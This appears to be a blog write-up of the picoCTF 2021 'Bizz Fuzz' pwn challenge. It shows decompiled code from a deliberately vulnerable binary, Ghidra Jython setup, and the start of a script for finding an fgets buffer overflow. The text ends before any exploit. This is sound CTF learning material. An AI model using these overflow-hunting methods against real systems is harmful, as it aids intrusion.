<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>picoCTF 2021 - Bizz Fuzz (Pwn) | Enigmatrix</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/favicon.png">
    <meta name="description" content="My first foray into Ghidra Jython scripting">
    
    <link rel="preload" href="/assets/css/0.styles.d518fe33.css" as="style"><link rel="preload" href="/assets/js/app.c3d8ca62.js" as="script"><link rel="preload" href="/assets/js/6.3722ae10.js" as="script"><link rel="preload" href="/assets/js/3.8eed2eee.js" as="script"><link rel="preload" href="/assets/js/11.fb3a3275.js" as="script"><link rel="prefetch" href="/assets/js/10.4b595a00.js"><link rel="prefetch" href="/assets/js/12.e01f3506.js"><link rel="prefetch" href="/assets/js/13.c3ff054c.js"><link rel="prefetch" href="/assets/js/14.cbc77de8.js"><link rel="prefetch" href="/assets/js/15.12185247.js"><link rel="prefetch" href="/assets/js/16.ff9fde79.js"><link rel="prefetch" href="/assets/js/17.c2e9ae64.js"><link rel="prefetch" href="/assets/js/18.b31259ba.js"><link rel="prefetch" href="/assets/js/19.9ea997bf.js"><link rel="prefetch" href="/assets/js/20.00359bb3.js"><link rel="prefetch" href="/assets/js/21.1cc8c958.js"><link rel="prefetch" href="/assets/js/4.5f78fef9.js"><link rel="prefetch" href="/assets/js/5.98a0c27e.js"><link rel="prefetch" href="/assets/js/7.ff10d07c.js"><link rel="prefetch" href="/assets/js/8.e129988e.js"><link rel="prefetch" href="/assets/js/9.868a262b.js"><link rel="prefetch" href="/assets/js/vuejs-paginate.92caeb0c.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d518fe33.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div id="root" class="theme-container no-sidebar" data-v-4533fcd8><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Enigmatrix</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
  Blog
</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
  Tags
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
  Blog
</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
  Tags
</a></div> <!----></nav>  <!----> </aside> <main class="page"><div id="post-header" class="theme-default-content" data-v-4533fcd8><div id="date" data-v-4533fcd8>11 April 2021, 10:35 am</div> <h1 id="title" data-v-4533fcd8>picoCTF 2021 - Bizz Fuzz (Pwn)</h1> <span id="description" data-v-4533fcd8>My first foray into Ghidra Jython scripting</span> <div id="tags" data-v-4533fcd8><a href="/tags/picoctf21" class="tag" data-v-4533fcd8>picoctf21</a><a href="/tags/ctf" class="tag" data-v-4533fcd8>ctf</a><a href="/tags/pwn" class="tag" data-v-4533fcd8>pwn</a><a href="/tags/ghidra" class="tag" data-v-4533fcd8>ghidra</a></div></div> <div class="theme-default-content content__default"><blockquote><p>FizzBuzz was too easy, so I made something a little bit harder... There's a buffer overflow in this problem, good luck finding it!</p></blockquote> <blockquote><p><a href="https://mercury.picoctf.net/static/8131f021924668df7e516ded9c9cadb4/vuln" target="_blank" rel="noopener noreferrer">vuln<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <code>nc mercury.picoctf.net 28132</code></p></blockquote> <blockquote><p>Hints:</p> <ol><li>What functions are imported? Where are they used? And what do these strings mean?</li> <li>Woah, some of these functions seem similar, can you figure them out one group at a time?</li> <li>If fancy new disassemblers take too long, there's always objdump!</li> <li>Have you heard of binary instrumentation before? It might keep you from running in circles. No promises.</li> <li>ANGR is another great framework.</li></ol></blockquote> <p>Wow. That's a lot to take in. But it boils down to just finding the one vulnerable input function that leads to a buffer overflow, right? Oh how wrong I was...</p> <p>Downloading and opening up the binary in Ghidra, I saw the <code>main</code> function:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0811d5b3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0811d941</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0811ead2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;buzz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0811fbb3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_08120828</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;buzz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_08121d33</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">.</span>
  <span class="token punctuation">.</span>
  <span class="token punctuation">.</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0814a663</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_0814ac03</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;buzz&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre></div><p>In total, there were around 80 calls to external functions. Opening up just one function shows:</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">FUN_0811d5b3</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  
  iVar1 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">FUN_081451af</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iVar1 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">FUN_0812d430</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      iVar1 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">FUN_0812d430</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iVar1 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">FUN_08140c2e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          iVar1 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">0x11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">.</span>
          <span class="token punctuation">.</span>
          <span class="token punctuation">.</span>
</code></pre></div><p>Well, this is going to be a fun ride. But atleast we have a <code>fizz_buzz</code> function:</p> <div class="language-c extra-class"><pre class="language-c"><code>uint <span class="token function">fizz_buzz</span><span class="token punctuation">(</span>uint param_1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  uint uVar2<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  undefined local_15<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span>
  uint i<span class="token punctuation">;</span>
  
  i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span><span class="token punctuation">(</span> true <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> true <span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span> true <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">&lt;=</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;%zu? &quot;</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token string">&quot;%9s&quot;</span><span class="token punctuation">,</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local_15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        len <span class="token operator">=</span> <span class="token function">strnlen</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          buf<span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> <span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
        iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;fizzbuzz&quot;</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token punctuation">(</span>i <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;buzz&quot;</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        uVar2 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> uVar2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    iVar1 <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> i<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>Nothing too interesting. With a given <code>param1</code>, the function prompts <code>{x}?</code> for each <code>x</code> in the range 1 to <code>param1</code>. For each prompt, the response must follow the fizz buzz rules, which are:</p> <ol><li>For a normal number, print it</li> <li>For a multiple of 3, print <code>fizz</code></li> <li>For a multiple of 5, print <code>buzz</code></li> <li>For a multiple of 15, print <code>fizzbuzz</code></li></ol> <p>The function then returns the number of such prompts that we have answered correctly, until the first failure or when we have reached the end of the range (<code>param1</code>)
dd
This is just where the fun begins though:</p> <p><img src="/assets/img/function-list.e020340d.png" alt="function-list.png"></p> <p>As painful it seemed, I waded though those functions for half and hour before I gave up and resorted to writing scripts. But in that half an hour I found a pattern.</p> <p>The only input is from <code>fgets</code> and the <code>scanf</code> inside <code>fizz_buzz</code>. There are several of these functions, where <code>fgets</code> is called with some declared array.</p> <div class="language-c extra-class"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">FUN_080f0357</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> local_51 <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> local_10<span class="token punctuation">;</span>
  
  local_10 <span class="token operator">=</span> <span class="token function">fizz_buzz</span><span class="token punctuation">(</span><span class="token number">0x4d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x1d</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_10 <span class="token operator">!=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>local_10 <span class="token operator">==</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">fgets</span><span class="token punctuation">(</span>local_51<span class="token punctuation">,</span><span class="token number">0xd</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre></div><p>Seems like we have to find the <em>one</em> function that calls <code>fgets</code> with a second parameter (the length of input) that exceeds the declared array size.</p> <h2 id="setup"><a href="#setup" class="header-anchor">#</a> Setup</h2> <p>I wanted to solve this using Ghidra since it was a long time since I did any decent Ghidra Scripting, and it would be my first time trying to do it in the Jython language.</p> <p>But I also wanted to have autocomplete and all those nice features that come when you use a <em>nice</em> language. Thankfully, we have some good methods to do this.</p> <ol><li><a href="https://github.com/AllsafeCyberSecurity/ghidra-jython-kernel" target="_blank" rel="noopener noreferrer">ghidra-jython-kernel<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <ul><li>Run the our code in a Python Notebook</li> <li>API is not imported into the global scope</li> <li>No autocomplete</li></ul></li> <li><a href="https://pypi.org/project/ghidra-bridge/" target="_blank" rel="noopener noreferrer">ghira-bridge<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <ul><li>Can harness the full power of Python 3, so we can use other external libraries as well</li> <li>Has the hassle of install scripts to link Ghidra with this API</li> <li>No autocomplete ðŸ˜¦</li></ul></li> <li><a href="https://github.com/VDOO-Connected-Trust/ghidra-pyi-generator" target="_blank" rel="noopener noreferrer">ghidra-pyi-generator<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <ul><li>Full API with generated type stubs</li> <li>Stuck with Jython</li></ul></li></ol> <p>I chose option 3 as I eventually wanted to write more permanent scripts for Ghidra in Jython, and considered this challenge as a good testing ground. Besides, the <a href="https://github.com/VDOO-Connected-Trust/ghidra-pyi-generator#readme" target="_blank" rel="noopener noreferrer">README.md<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> is <em>very</em> convincing.</p> <p><img src="https://github.com/VDOO-Connected-Trust/ghidra-pyi-generator/raw/master/media/pycharm_demo.gif" alt="type checking demo"> <strong>Oh, the wonders of autocomplete!</strong></p> <details class="custom-block details"><summary>What to do if the type stubs cannot be installed</summary> <p>Do the below if you use Windows or if the type stubs fail to install.
Setup a <a href="https://docs.python.org/3/library/venv.html" target="_blank" rel="noopener noreferrer">venv<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> in your desired <code>ghidra_scripts</code> folder (or where ever you put your scripts):</p> <div class="language-bash extra-class"><pre class="language-bash"><code>python3 -m venv ~/ghidra_scripts/venv
</code></pre></div><p>Download the <a href="https://github.com/VDOO-Connected-Trust/ghidra-pyi-generator/releases" target="_blank" rel="noopener noreferrer">type stubs<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> somewhere, then activate the <code>venv</code> shell, following the table below</p> <table><thead><tr><th>Shell</th> <th>Command</th></tr></thead> <tbody><tr><td>bash/zsh</td> <td><code>source &lt;venv&gt;/bin/activate</code></td></tr> <tr><td>fish</td> <td><code>source &lt;venv&gt;/bin/activate.fish</code></td></tr> <tr><td>csh/tcsh</td> <td><code>source &lt;venv&gt;/bin/activate.csh</code></td></tr> <tr><td>PowerShell Core</td> <td><code>&lt;venv&gt;/bin/Activate.ps1</code></td></tr> <tr><td>cmd.exe</td> <td><code>&lt;venv&gt;\Scripts\activate.bat</code></td></tr> <tr><td>PowerShell</td> <td><code>&lt;venv&gt;\Scripts\Activate.ps1</code></td></tr></tbody></table> <p>Then run</p> <div class="language-bash extra-class"><pre class="language-bash"><code>python3 -m pip <span class="token function">install</span> ghidra_stubs*.whl
</code></pre></div><p>to install the type stub into the <code>venv</code>.</p> <p>Now, configure whatever IDE to use this <code>venv</code> and enjoy proper autocomplete. I use IDEA so I used (https://www.jetbrains.com/help/idea/creating-virtual-environment.html)</p></details> <div class="custom-block tip"><p class="custom-block-title">Quick primer to Jython</p> <p><code>currentProgram</code> is the current program. There are a lot of utility functions like <code>toAddr</code> or <code>getFunction</code> that are imported automatically.</p> <p>Don't hesitate to randomly type something you want, and get related functions for it (yay autocomplete!) e.g.</p> <p><img src="/assets/img/random-types.81a0e19c.png" alt="type completion at its best"></p> <p>If a object has a <code>x.getXXX()</code> or <code>x.setXXX(X value)</code> method, you can just do <code>x.XXX</code> or <code>x.XXX = value</code> instead.</p> <p>Scripts should be in <code>~/ghidra_scripts</code> where <code>~</code> is your home directory, or in other paths that you have set as allowed. Run the script using the Script Manager.</p></div> <h2 id="finding-the-overflow"><a href="#finding-the-overflow" class="header-anchor">#</a> Finding the overflow</h2> <p>My rough idea of finding the offending buffer overflow was:</p> <ol><li>Find the <code>fgets(dest, n, stdin)</code> function</li> <li>Find all references to it</li> <li>Iterate through them to find:</li> <li>The size of the first parameter, and compare it to the second parameter</li> <li>Print out where the second parameter is bigger.</li></ol> <h3 id="finding-the-fgets-function"><a href="#finding-the-fgets-function" class="header-anchor">#</a> Finding the <code>fgets</code> function</h3> <p>This was harder than expected, as Ghidra had some trouble mapping external function names to the global namespace, so the intuitive code returns false</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token boolean">None</span> <span class="token operator">!=</span> getFunction<span class="token punctuation">(</span><span class="token string">&quot;fgets&quot;</span><span class="token punctuation">)</span>
